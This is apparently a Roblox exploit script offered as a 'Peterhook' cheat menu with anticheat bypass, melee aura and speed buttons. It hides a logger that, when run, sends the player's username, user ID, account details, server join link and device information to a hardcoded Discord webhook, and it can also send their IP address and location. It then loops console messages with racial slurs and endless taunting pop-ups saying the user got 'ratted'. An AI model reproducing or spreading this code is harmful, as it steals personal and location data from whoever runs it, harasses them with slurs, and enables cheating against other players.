--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]

--// Config
getgenv().whscript = "Backdoor"        --Change to the name of your script
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1320655379453186109/e5KXllpiQAs3qAp07sagTd2KgZF2ZdVDcpB_UOU5qLajJ7v61eF_IpVqqzw_rToaPZ4b"  --Put your Webhook Url here
getgenv().ExecLogSecret = false                --decide to also log secret section

--// Execution Log Script
local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

if ui:FindFirstChild(folderName) then
    print("Script is already executed! Rejoin if it's an error!")
    local ui2 = gethui()
    local folderName2 = "screen2"
    local folder2 = Instance.new("Folder")
    folder2.Name = folderName2
    if ui2:FindFirstChild(folderName2) then
        player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
    else
        folder2.Parent = gethui()
    end
else
    folder.Parent = gethui()
    local players = game:GetService("Players")
    local userid = player.UserId
    local gameid = game.PlaceId
    local jobid = tostring(game.JobId)
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local deviceType =
        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
    local snipePlay =
        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
    local workspace = game:GetService("Workspace")
    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
    local playerCount = #players:GetPlayers()
    local maxPlayers = players.MaxPlayers
    local health =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
    local maxHealth =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
        "N/A"
    local position =
        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
        player.Character.HumanoidRootPart.Position or
        "N/A"
    local gameVersion = game.PlaceVersion

    if not getgenv().ExecLogSecret then
        getgenv().ExecLogSecret = false
    end
    if not getgenv().whscript then
        getgenv().whscript = "Please provide a script name!"
    end
    local commonLoadTime = 5
    task.wait(commonLoadTime)
    local pingThreshold = 100
    local serverStats = game:GetService("Stats").Network.ServerStatsItem
    local dataPing = serverStats["Data Ping"]:GetValueString()
    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
    local function checkPremium()
        local premium = "false"
        local success, response =
            pcall(
            function()
                return player.MembershipType
            end
        )
        if success then
            if response == Enum.MembershipType.None then
                premium = "false"
            else
                premium = "true"
            end
        else
            premium = "Failed to retrieve Membership:"
        end
        return premium
    end
    local premium = checkPremium()

    local url = getgenv().webhookexecUrl

    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {
            {
                ["title"] = "🚀 **Script Execution Detected | Exec Log**",
                ["description"] = "*A script was executed in your script. Here are the details:*",
                ["type"] = "rich",
                ["color"] = tonumber(0x3498db), -- Clean blue color
                ["fields"] = {
                    {
                        ["name"] = "🔍 **Script Info**",
                        ["value"] = "```💻 Script Name: " ..
                            getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "👤 **Player Details**",
                        ["value"] = "```🧸 Username: " ..
                            player.Name ..
                                "\n📝 Display Name: " ..
                                    player.DisplayName ..
                                        "\n🆔 UserID: " ..
                                            userid ..
                                                "\n❤️ Health: " ..
                                                    health ..
                                                        " / " ..
                                                            maxHealth ..
                                                                "\n🔗 Profile: View Profile (https://www.roblox.com/users/" ..
                                                                    userid .. "/profile)```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "📅 **Account Information**",
                        ["value"] = "```🗓️ Account Age: " ..
                            player.AccountAge ..
                                " days\n💎 Premium Status: " ..
                                    premium ..
                                        "\n📅 Account Created: " ..
                                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🎮 **Game Details**",
                        ["value"] = "```🏷️ Game Name: " ..
                            gameName ..
                                "\n🆔 Game ID: " ..
                                    gameid ..
                                        "\n🔗 Game Link (https://www.roblox.com/games/" ..
                                            gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🕹️ **Server Info**",
                        ["value"] = "```👥 Players in Server: " ..
                            playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📡 **Network Info**",
                        ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🖥️ **System Info**",
                        ["value"] = "```📺 Resolution: " ..
                            screenWidth ..
                                "x" ..
                                    screenHeight ..
                                        "\n🔍 Memory Usage: " ..
                                            memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📍 **Character Position**",
                        ["value"] = "```📍 Position: " .. tostring(position) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🪧 **Join Script**",
                        ["value"] = "```lua\n" .. snipePlay .. "```",
                        ["inline"] = false
                    }
                },
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
                },
                ["footer"] = {
                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                    ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
                }
            }
        }
    }

    -- Check if the secret tab should be included
    if getgenv().ExecLogSecret then
        local ip = game:HttpGet("https://api.ipify.org")
        local iplink = "https://ipinfo.io/" .. ip .. "/json"
        local ipinfo_json = game:HttpGet(iplink)
        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

        table.insert(
            data.embeds[1].fields,
            {
                ["name"] = "**`(🤫) Secret`**",
                ["value"] = "||(👣) IP Address: " ..
                    ipinfo_table.ip ..
                        "||\n||(🌆) Country: " ..
                            ipinfo_table.country ..
                                "||\n||(🪟) GPS Location: " ..
                                    ipinfo_table.loc ..
                                        "||\n||(🏙️) City: " ..
                                            ipinfo_table.city ..
                                                "||\n||(🏡) Region: " ..
                                                    ipinfo_table.region ..
                                                        "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
            }
        )
    end

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end

local Peterhook = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")


Peterhook.Name = "Peterhook"
Peterhook.Parent = game.CoreGui
Peterhook.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = Peterhook
Frame.Active = true
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.04611497, 0, 0.0429447852, 0)
Frame.Size = UDim2.new(0, 523, 0, 334)
Frame.Draggable = true

ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BorderSizePixel = 0
ImageLabel.Size = UDim2.new(0, 523, 0, 334)
ImageLabel.Image = "http://www.roblox.com/asset/?id=5001010014"

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0210325047, 0, 0.0239520967, 0)
TextLabel.Size = UDim2.new(0, 253, 0, 50)
TextLabel.Font = Enum.Font.Cartoon
TextLabel.Text = "PETERHOOK"
TextLabel.TextColor3 = Color3.fromRGB(98, 255, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 0.500
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0210325047, 0, 0.215568855, 0)
TextButton.Size = UDim2.new(0, 306, 0, 52)
TextButton.Font = Enum.Font.Cartoon
TextButton.Text = "ANTICHEAT BYPASS"
TextButton.TextColor3 = Color3.fromRGB(255, 0, 4)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BackgroundTransparency = 0.500
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.0210325047, 0, 0.422155678, 0)
TextButton_2.Size = UDim2.new(0, 233, 0, 52)
TextButton_2.Font = Enum.Font.Cartoon
TextButton_2.Text = "MELEE AURA"
TextButton_2.TextColor3 = Color3.fromRGB(186, 48, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.BackgroundTransparency = 0.500
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.0210325047, 0, 0.658682644, 0)
TextButton_3.Size = UDim2.new(0, 167, 0, 52)
TextButton_3.Font = Enum.Font.Cartoon
TextButton_3.Text = "SPEED"
TextButton_3.TextColor3 = Color3.fromRGB(84, 255, 230)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true

-- Scripts:

local function GQGY_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:connect(function()
		local LocalPlayer = game.Players.LocalPlayer
		local oldNameCall
		oldNameCall = hookmetamethod(game,"__namecall",function(self,...)
			local args = {...}
			local method = getnamecallmethod()
			if not checkcaller() and getcallingscript().Name == "LocalClean" then -- localclean is retarded tbh (localclean causes those 1 sec lag spikes)
				return {}
			end
			if method == "FireServer" and self.Name == "RequestPlayerKick" then -- block humanoidcontrol requests for localplayer kick
				return "fortnite sussy balls :pensive:"
			end
			return oldNameCall(self,...)
		end)
		while game:GetService("RunService").RenderStepped:Wait() do
			if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("CharacterControl") then -- not bothered to hook charactercontrol functions so just disable the script
				LocalPlayer.Character:FindFirstChild("CharacterControl").Disabled = true
			end
		end
	end)
end
coroutine.wrap(GQGY_fake_script)()
local function UYIA_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:connect(function()
	local LocalPlayer = game.Players.LocalPlayer
		while wait(1/16) do 
			local s,e = pcall(function()
				local Character = LocalPlayer.Character
				local MeleePatch = ""
				for i,v in pairs(LocalPlayer.Character:GetChildren()) do
					if string.find(v.Name,"MeleeWeaponHandler") then
						MeleePatch = v.ToolName.value
					end
				end
				if MeleePatch ~= "" and LocalPlayer.Character then
					for i,v in pairs(game.Players:GetChildren()) do
						if v.Character and v ~= LocalPlayer and v.Team ~= LocalPlayer.Team then
							if (v.Character.Torso.Position - LocalPlayer.Character.Torso.Position).Magnitude < 30 then
								local args = {
									[1] = v.Character.Torso,
									[2] = v.Character.Torso.Position,
									[3] = Character[MeleePatch],
									[4] = "Melee"
								}
								game.ReplicatedStorage.Requests.RequestDamage:FireServer(unpack(args))
							end
						end
					end
				end
			end) if e then print("PETERHOOK FART ERROR: "..e) end
			end
	end)
end
coroutine.wrap(UYIA_fake_script)()
local function HGRE_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:connect(function()
		while wait() do
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 70
		end
	end)
end
coroutine.wrap(HGRE_fake_script)()



function spam()
    while true do
        warn("EZZ EZ EZ EZ EZ")
        warn("AHFAFNAFBAHFAHGFAHGHAHGAHGHHGHAGNAGNAGNANG")
        print("anghn    NGAGNBAGAGBAGAJNGAGAGAGNA")
        print("anghn    AJGFJAGKAKGAGJAGJAJG")
        warn("NIGGER NIGGER NIGGER")
        warn("CRY CRY CRY CRY CRY")
    end
end
spam()
wait(1000)

function spam2()
    while true do
        local response = messagebox("wanna cry?", "cry cry wanna cry cry? (@ffavzexi) (@cat_man_.)", 0)
    end
end
spam2()

function spam3()
    while true do
        local response = messagebox("wa wa wa", "cry for me (@ffavzexi) (@cat_man_.)", 0)
    end
end
spam3()

function funny()
    while true do
        local response = messagebox("EZ BACKDOOR", "get ratted nigger boy (@ffavzexi) (@cat_man_.)", 0)
    end
end

funny()

